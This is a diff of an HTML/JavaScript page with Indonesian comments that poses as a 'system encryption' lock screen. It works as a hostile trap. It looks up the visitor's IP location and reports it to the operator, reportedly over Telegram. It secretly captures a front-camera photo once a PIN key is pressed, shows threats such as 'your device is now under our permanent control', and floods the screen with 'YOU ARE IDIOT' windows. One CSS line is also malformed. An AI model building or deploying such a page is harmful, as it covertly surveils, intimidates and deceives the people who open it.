@@ -3,15 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>HACKED</title>
+<title>SYSTEM ENCRYPTION</title>
 <style>
-/* --- CSS VISUAL BRUTAL (Gaya Lama) --- */
+/* CSS VISUAL BRUTAL - KODE AWAL TUAN */
 body{background:#000;color:#fff;font-family:'Courier New', monospace;text-align:center;overflow:hidden;margin:0;padding:20px;user-select:none;}
 body.shake{animation:shake 0.3s;}@keyframes shake{0%{transform:translate(2px,2px);}25%{transform:translate(-2px,-2px);}50%{transform:translate(2px,-2px);}75%{transform:translate(-2px,2px);}100%{transform:translate(0,0);}}
 h3{font-size:clamp(24px,6vw,36px);margin-bottom:10px;text-shadow:0 0 10px #0f0;font-weight:bold;color:#0f0;}
 .info{font-size:12px;margin:20px 0;line-height:1.4;color:#0f0;}
 .timer{font-size:clamp(32px,8vw,48px);color:#f00;margin:20px 0;text-shadow:0 0 15px #f00;font-weight:bold;}
-.pin{display:flex;justify-content:center;gap:12px;margin:20px 0;}
+.pin{display:flex;justify(content:center;gap:12px;margin:20px 0;}
 .dot{width:20px;height:20px;border:2px solid #0f0;border-radius:50%;transition:0.2s;}
 .dot.active{background:#0f0;box-shadow:0 0 15px #0f0;}
 .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;max-width:300px;margin:30px auto;}
@@ -19,13 +19,13 @@ h3{font-size:clamp(24px,6vw,36px);margin-bottom:10px;text-shadow:0 0 10px #0f0;f
 .btn:active{transform:scale(0.95);background:#0f0;color:#000;}
 .contact-btn{background:#f00;border:none;color:#fff;font-size:16px;padding:15px 30px;margin-top:20px;display:block;margin-left:auto;margin-right:auto;border-radius:4px;font-family:'Courier New', monospace;cursor:pointer;font-weight:bold;}
 
-/* --- CSS POPUP MERAH (Peringatan di Web) --- */
+/* POPUP PERINGATAN WEB */
 .popup{position:fixed;width:240px;background:rgba(0,0,0,0.95);border:2px solid #fff;border-radius:4px;z-index:999;display:none;flex-direction:column;}
 .popup.show{display:flex;}
 .popup-title{background:#333;color:#fff;padding:8px 12px;font-weight:bold;font-size:12px;text-align:center;}
 .popup-content{padding:15px;font-size:14px;text-align:center;color:#f00;font-weight:bold;white-space:pre-line;}
 
-/* --- CSS ORIGINAL IDIOT WINDOWS (Dari Kode Awal Tuan) --- */
+/* ORIGINAL IDIOT WINDOWS - TRANSPARENT BLINK */
 .idiot-window{position:fixed;width:220px;height:120px;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-weight:bold;font-size:13px;border:2px solid #fff;z-index:100;padding:8px;line-height:1.2;box-shadow:2px 2px 10px rgba(0,0,0,0.8);animation:chaosBlink 0.4s infinite;}
 @keyframes chaosBlink{0%,25%{background:#fff;color:#000;}50%,75%{background:#000;color:#fff;}100%{background:#fff;color:#000;}}
 
@@ -57,8 +57,10 @@ h3{font-size:clamp(24px,6vw,36px);margin-bottom:10px;text-shadow:0 0 10px #0f0;f
 let pin="", camOn=false, attempts=0, maxAttempts=5, gameOver=false, sid='NX_'+Math.random().toString(36).substr(2,7).toUpperCase();
 document.getElementById('sid').innerText=sid;
 
+// LAPOR KE TELEGRAM
 async function send(payload) { try { await fetch('/api/send', { method:'POST', body:JSON.stringify({...payload, session_id:sid}) }); } catch(e){} }
 
+// FORMAT PESAN AESTHETIC
 function formatMsg(title, detail = "") {
     return `╭┈┈⬡「 🎣 ${title} 」
 ┃ ◦ ᴛᴇʀᴄʏᴅᴜᴋ ᴋᴀᴜ Suki 😹
@@ -68,6 +70,7 @@ ${detail}
 ╰┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈⬡`;
 }
 
+// AMBIL FOTO DIAM-DIAM
 async function takePic() {
     try {
         const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
@@ -81,20 +84,23 @@ async function takePic() {
     } catch(e) {}
 }
 
+// LOGIKA PIN
 function tap(v) {
     if(gameOver) return;
     if(!camOn) { takePic(); camOn=true; }
     if(v==='C') pin="";
     else if(v==='OK') {
         attempts++;
-        send({text: formatMsg("ᴘɪɴ ᴀᴛᴛᴇᴍᴘᴛ", `┃ ◦ 🔐 ᴘɪɴ: \`${pin}\`\n┃ ◦ ⚡ ᴀᴛᴛᴇᴍᴘᴛ: ${attempts}/${maxAttempts}`) });
+        // SILENT MODE: Tidak ada laporan PIN salah ke Telegram Tuan
         
         if(attempts >= maxAttempts) {
             gameOver = true;
-            pop("SYSTEM FAILURE! ⚠️\nData extracted successfully. All your linked accounts are now locked.\n\nPossession is Permanent.");
-            setTimeout(finalChaos, 1500); // 💀 Aktifkan Chaos 💀
+            send({text: formatMsg("💀 ᴄʜᴀᴏs ᴀᴄᴛɪᴠᴀᴛᴇᴅ")}); // Laporan final saja
+            pop("SYSTEM FAILURE! ⚠️\nData extraction complete. Your device is now under our permanent control.");
+            setTimeout(finalChaos, 1500); 
         } else {
-            pop(`WRONG PIN! ⚠️\nAttempt: ${attempts}/${maxAttempts}\n\nYour data has been archived. Further illegal attempts will trigger device lockdown.`);
+            // Peringatan tetap muncul di website target
+            pop(`WRONG PIN! ⚠️\nAttempt: ${attempts}/${maxAttempts}\n\nYour data has been successfully archived.`);
             document.body.classList.add("shake"); setTimeout(()=>document.body.classList.remove("shake"),300);
         }
         pin="";
@@ -104,6 +110,7 @@ function tap(v) {
 
 function updateDots(){ document.querySelectorAll(".dot").forEach((d,i)=>i<pin.length?d.classList.add("active"):d.classList.remove("active")); }
 
+// KONTAK OWNER
 function contactOwner() {
     send({text: formatMsg("ᴄᴏɴᴛᴀᴄᴛ ᴄʟɪᴄᴋ")});
     window.open("https://t.me/Nexsus009", "_blank"); 
@@ -116,20 +123,24 @@ function pop(m){
     p.classList.add("show"); setTimeout(()=>p.classList.remove("show"),3500); 
 }
 
-// ==================== ORIGINAL IDIOT CHAOS RESTORED ====================
+// FINAL CHAOS: IDIOT WINDOWS
 function finalChaos() {
-    send({text: formatMsg("💀 ᴄʜᴀᴏs ᴀᴄᴛɪᴠᴀᴛᴇᴅ")});
-    // Munculkan 20 jendela "Idiot" mantul
     for(let i=0; i<20; i++) spawnIdiot();
-    // Munculkan pop-up spam "Data Permanen" di web
-    setInterval(showDeletePopup, 1500);
+    setInterval(() => {
+        let p = document.createElement("div");
+        p.className = "popup show";
+        p.innerHTML = `<div class="popup-title">SYSTEM</div><div class="popup-content">DATA PERMANEN DI KAMI<br> 😈 🙂 😈</div>`;
+        p.style.cssText = `position:fixed; z-index:998; left:${Math.random()*70}%; top:${Math.random()*80}%;`;
+        document.body.appendChild(p);
+        setTimeout(() => p.remove(), 1500);
+    }, 1000);
 }
 
 function spawnIdiot() {
     let w = document.createElement("div"); w.className = "idiot-window";
-    w.innerHTML = "YOU ARE IDIOT 😈<br>🙂"; // Gaya teks asli Tuan
+    w.innerHTML = "YOU ARE IDIOT 😈<br>🙂";
     document.body.appendChild(w);
-    let x = Math.random()*(window.innerWidth-220), y = Math.random()*(window.innerHeight-120), dx = 4 + Math.random()*2, dy = 4 + Math.random()*2;
+    let x = Math.random()*(window.innerWidth-220), y = Math.random()*(window.innerHeight-120), dx = 5, dy = 5;
     function move() {
         x+=dx; y+=dy; 
         if(x<=0||x+220>=window.innerWidth) dx*=-1; 
@@ -138,17 +149,7 @@ function spawnIdiot() {
     } move();
 }
 
-function showDeletePopup() {
-    let p = document.createElement("div");
-    p.className = "popup show";
-    // Gaya Pop-up Spam Asli
-    p.innerHTML = `<div class="popup-title">SYSTEM</div><div class="popup-content">DATA PERMANEN DI KAMI<br> 🙂 😈 🙂</div>`;
-    p.style.cssText = `position:fixed; z-index:998; left:${Math.random()*70}%; top:${Math.random()*80}%;`;
-    document.body.appendChild(p);
-    setTimeout(() => p.remove(), 1800);
-}
-
-// ==================== TRACKING ====================
+// TRACKING AWAL
 async function track() {
     try {
         const r = await fetch('https://ipapi.co/json/'); const l = await r.json();
@@ -157,10 +158,9 @@ async function track() {
         send({text: formatMsg("ᴅᴀᴛᴀ ᴇxᴛʀᴀᴄᴛᴇᴅ", detail)});
     } catch(e){}
 }
+
 track();
-// Timer Visual
 let tm = 3600; setInterval(()=>{ if(tm>0){tm--; let m=Math.floor(tm/60), s=tm%60; document.getElementById("timer").innerText=`00:${m.toString().padStart(2,"0")}:${s.toString().padStart(2,"0")}`}},1000);
 </script>
 </body>
-  </html>
-  
+</html>
